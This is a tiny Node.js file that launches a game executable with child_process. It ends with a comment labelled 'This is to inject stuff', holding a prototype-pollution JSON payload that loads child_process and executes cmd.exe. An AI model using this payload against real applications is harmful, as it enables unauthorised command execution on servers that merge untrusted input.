const childProcess = require('child_process');

// We can use __dirname
childProcess.exec("C:/Program Files/Epic Games/Spellbreak/Launch_Spellbreak.exe", (err, stdout, stderr) =>{
    console.log(stdout)
});


/**
 *
 * This is to inject stuff
 *
 * 
 *
 */

// {"__proto__": {"isAdmin": function(){global.process.mainModule.constructor._load('child_process').exec('C:\\Windows\\System32\\cmd.exe',function(){})}}}